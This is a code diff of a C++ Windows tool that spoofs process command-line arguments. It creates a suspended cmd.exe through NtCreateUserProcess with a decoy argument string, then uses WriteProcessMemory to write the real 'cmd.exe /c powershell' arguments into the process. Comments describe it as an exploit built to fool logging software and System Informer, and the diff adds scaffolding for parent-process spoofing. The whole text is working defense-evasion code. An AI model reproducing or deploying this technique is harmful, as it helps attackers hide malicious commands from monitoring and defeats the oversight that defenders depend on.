@@ -1,18 +1,30 @@
-#include <iostream>
 #include <Windows.h>
+#include <stdio.h>
 #include "ntdll.h"
 #pragma comment(lib, "ntdll")
 
 #define MAX_STR 32767
 
+// Arguments that get displayed in the logs
+// System Informer will display the most recent modification, so if that's a
+// concern, set this to a substring of the real arguments
+LPCWSTR FakeCommandLine = L"cmd.exe";
+// Path to real executable
+LPCWSTR NtImagePath = L"\\??\\C:\\Windows\\System32\\cmd.exe";
+// Real options we start the command with
+LPCWSTR RealCommandLine = L"cmd.exe /c powershell";
+
 // We use this function to create a unicode string with a buffer big enough to store our real arguments
+// This removes the length limitation in previous versions of the exploit, and since we pad with null bytes
+// most logging software won't recognise that the string is longer than it seems
 BOOL SupersizeUString(PUNICODE_STRING ustr, USHORT length, LPCWSTR initial) {
     if (length > MAX_STR) {
         printf("Length %d is too long to fit into a Windows unicode string (%d max).\n", length, MAX_STR);
         return FALSE;
     }
+    
     // Make sure there's room for the null byte
-    USHORT trueSize = sizeof(WCHAR) * (length + 1);
+    USHORT trueSize = length + sizeof(WCHAR);
     // Set up max length to be the size of the buffer
     ustr->Buffer = (PWSTR)malloc(trueSize);
     if (ustr->Buffer == NULL) {
@@ -29,15 +41,6 @@ BOOL SupersizeUString(PUNICODE_STRING ustr, USHORT length, LPCWSTR initial) {
 }
 
 int main(int argc, char** argv) {
-    // Arguments that get displayed in the logs
-    // System Informer will display the most recent modification, so if that's a
-    // concern, set this to a substring of the real arguments
-    LPCWSTR FakeCommandLine = L"cmd.exe";
-    // Path to real executable
-    LPCWSTR NtImagePath = L"\\??\\C:\\Windows\\System32\\cmd.exe";
-    // Real options we start the command with
-    LPCWSTR RealCommandLine = L"cmd.exe /c powershell";
-
     USHORT fakeCommandLineLength = lstrlenW(FakeCommandLine) * sizeof(WCHAR);
     USHORT realCommandLineLength = lstrlenW(RealCommandLine) * sizeof(WCHAR);
     // Get the length we should be setting the arguments string to (max of its two values)
@@ -47,7 +50,14 @@ int main(int argc, char** argv) {
 
     // Set up unicode strings
     UNICODE_STRING UFakeCommandLine;
+    //RtlInitUnicodeString(&UFakeCommandLine, (PWSTR)FakeCommandLine);
     SupersizeUString(&UFakeCommandLine, highestLength, FakeCommandLine);
+    UNICODE_STRING URealCommandLine;
+    //RtlInitUnicodeString(&URealCommandLine, (PWSTR)RealCommandLine);
+    SupersizeUString(&URealCommandLine, highestLength, RealCommandLine);
+
+    printf("Real: %d %d %ls\n", URealCommandLine.Length, URealCommandLine.MaximumLength, URealCommandLine.Buffer);
+    printf("Fake: %d %d %ls\n", UFakeCommandLine.Length, UFakeCommandLine.MaximumLength, UFakeCommandLine.Buffer);
 
     UNICODE_STRING UNtImagePath;
     RtlInitUnicodeString(&UNtImagePath, (PWSTR)NtImagePath);
@@ -63,25 +73,59 @@ int main(int argc, char** argv) {
     CreateInfo.Size = sizeof(CreateInfo);
     CreateInfo.State = PsCreateInitialState;
 
+    OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
+    PPS_STD_HANDLE_INFO stdHandleInfo = (PPS_STD_HANDLE_INFO)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
+    PCLIENT_ID clientId = (PCLIENT_ID)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
+    PSECTION_IMAGE_INFORMATION SecImgInfo = (PSECTION_IMAGE_INFORMATION)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));
+
     // Initialize the PS_ATTRIBUTE_LIST structure
     // We use this to pass other important data to the new process
     // Just using it for the image name at the moment (this appears to be the main place it's important)
     // Is it possible to use PS_ATTRIBUTE_PARENT_PROCESS for PPID spoofing?
-    PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
-    AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
+    PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
+    AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
+
+    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_CLIENT_ID;
+    AttributeList->Attributes[0].Size = sizeof(CLIENT_ID);
+    AttributeList->Attributes[0].ValuePtr = clientId;
+
+    AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_IMAGE_INFO;
+    AttributeList->Attributes[1].Size = sizeof(SECTION_IMAGE_INFORMATION);
+    AttributeList->Attributes[1].ValuePtr = SecImgInfo;
+
     // Second usage of NtImagePath
-    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
-    AttributeList->Attributes[0].Size = UNtImagePath.Length;
-    AttributeList->Attributes[0].Value = (ULONG_PTR)UNtImagePath.Buffer;
+    AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
+    AttributeList->Attributes[2].Size = UNtImagePath.Length;
+    AttributeList->Attributes[2].ValuePtr = UNtImagePath.Buffer;
+
+    AttributeList->Attributes[3].Attribute = PS_ATTRIBUTE_STD_HANDLE_INFO;
+    AttributeList->Attributes[3].Size = sizeof(PS_STD_HANDLE_INFO);
+    AttributeList->Attributes[3].ValuePtr = stdHandleInfo;
+    
+    // Can be used for PPID spoofing if we have a handle to another process
+    HANDLE hParent = GetCurrentProcess();
+    if (hParent)
+    {
+        AttributeList->Attributes[4].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
+        AttributeList->Attributes[4].Size = sizeof(HANDLE);
+        AttributeList->Attributes[4].ValuePtr = hParent;
+    }
+    else
+    {
+        AttributeList->TotalLength -= sizeof(PS_ATTRIBUTE);
+    }
 
     // Create the process
     // Make sure to start the thread suspended so we don't risk a race condition
     HANDLE hProcess, hThread = NULL;
-    NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, AttributeList);
+    NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, &objAttr, &objAttr, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, AttributeList);
 
     // Clean up
     // Free up the heap and destroy the parameters we don't need anymore
     RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
+    RtlFreeHeap(RtlProcessHeap(), 0, stdHandleInfo);
+    RtlFreeHeap(RtlProcessHeap(), 0, clientId);
+    RtlFreeHeap(RtlProcessHeap(), 0, SecImgInfo);
     RtlDestroyProcessParameters(ProcessParameters);
 
 
@@ -113,7 +157,7 @@ int main(int argc, char** argv) {
 
     // Set the actual arguments we are looking to use
     // Hey look it's our buffer from earlier
-    success = WriteProcessMemory(hProcess, parameters.CommandLine.Buffer, RealCommandLine, realCommandLineLength, &bytesWritten);
+    success = WriteProcessMemory(hProcess, parameters.CommandLine.Buffer, URealCommandLine.Buffer, URealCommandLine.Length, &bytesWritten);
     if (!success) {
         printf("Could not call WriteProcessMemory to update commandline args\n");
         return 1;
